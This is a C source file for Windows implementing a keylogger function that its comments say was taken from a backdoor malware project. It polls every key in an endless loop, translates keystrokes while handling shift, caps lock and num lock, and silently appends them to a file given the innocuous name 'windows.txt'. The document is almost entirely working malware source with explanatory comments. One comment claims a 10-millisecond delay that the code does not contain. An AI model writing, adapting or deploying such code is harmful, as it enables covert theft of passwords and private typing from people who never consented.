#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include<WinSock2.h>
#include<winsock.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <sys/stat.h>
#include <sys/types.h>

// This keylogger code was taken by a person that made the backdoor project which i was inspired by: https://github.com/bryanmax9/BackDoor-Malware-in-C-Language/blob/main/
// Some comments were edited to make the code more understandable.

DWORD WINAPI keyLogger(){

	// In this code we will use HEX numbers, so if you don't understand something you can convert the HEX numbers in decimals.

	int vkey,last_key_state[0xFF];
	int isCAPSLOCK,isNUMLOCK;
	int isL_SHIFT,isR_SHIFT;
	int isPressed;
	char showKey;
	char NUMCHAR[]=")!@#$%^&*(";
	char chars_vn[]=";=,-./`";
	char chars_vs[]=":+<_>?~";
	char chars_va[]="[\\]\';";
	char chars_vb[]="{|}\"";
	FILE *KEY_LOG_FILE;
	char KEY_LOG_NAME[]="windows.txt";
	// Setting all elements to 0 in last_key_state array.
	for(vkey=0;vkey<0xFF;vkey++){
		last_key_state[vkey]=0;
	}

	// Running infinite
	while(1){
		// While gets executed every 10 milliseconds to get all pressed keys but at the same time to avoid stressing the CPU.

		// Get key state of CAPSLOCK, NUMLOCK, LEFT SHIFT, and RIGHT SHIFT, keys that change the "standard behaviour" of the keyboard.
		isCAPSLOCK=(GetKeyState(0x14)&0xFF)>0?1:0;
		isNUMLOCK=(GetKeyState(0x90)&0xFF)>0?1:0;
		isL_SHIFT=(GetKeyState(0xA0)&0xFF00)>0?1:0;
		isR_SHIFT=(GetKeyState(0xA1)&0xFF00)>0?1:0;

		// Controlling all virtual keys through a loop, and using cases to pressed keys inside a file.
		for(vkey=0;vkey<0xFF;vkey++){
			isPressed=(GetKeyState(vkey)&0xFF00)>0?1:0;
			showKey=(char)vkey;
			if(isPressed==1 && last_key_state[vkey]==0){

				// For alphabets
				if(vkey>=0x41 && vkey<=0x5A){
					if(isCAPSLOCK==0){
						if(isL_SHIFT==0 && isR_SHIFT==0){
							showKey=(char)(vkey+0x20);
						}
					}
					else if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=(char)(vkey+0x20);
					}
				}

				// For num chars
				else if(vkey>=0x30 && vkey<=0x39){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=NUMCHAR[vkey-0x30];
					}
				}

				// For right side numpad
				else if(vkey>=0x60 && vkey<=0x69 && isNUMLOCK==1){
					showKey=(char)(vkey-0x30);
				}

				// For printable chars
				else if(vkey>=0xBA && vkey<=0xC0){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=chars_vs[vkey-0xBA];
					}
					else{
						showKey=chars_vn[vkey-0xBA];
					}
				}
				else if(vkey>=0xDB && vkey<=0xDF){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=chars_vb[vkey-0xDB];
					}
					else{
						showKey=chars_va[vkey-0xDB];
					}
				}

				// For right side chars ./*-+..
				// For chars like space ,\n,enter etc..
				// For enter use newline char
				// Don't print other keys
				else if(vkey==0x0D){
					showKey=(char)0x0A;
				}
				else if(vkey>=0x6A && vkey<=0x6F){
					showKey=(char)(vkey-0x40);
				}
				else if(vkey!=0x20 && vkey!=0x09){
					showKey=(char)0x00;
				}

				//:print_and_save_captured_key
				if(showKey!=(char)0x00){
					KEY_LOG_FILE=fopen(KEY_LOG_NAME,"a");
					putc(showKey,KEY_LOG_FILE);
					fclose(KEY_LOG_FILE);
				}
			}
			// Save last state of key
			last_key_state[vkey]=isPressed;
		}


	}
}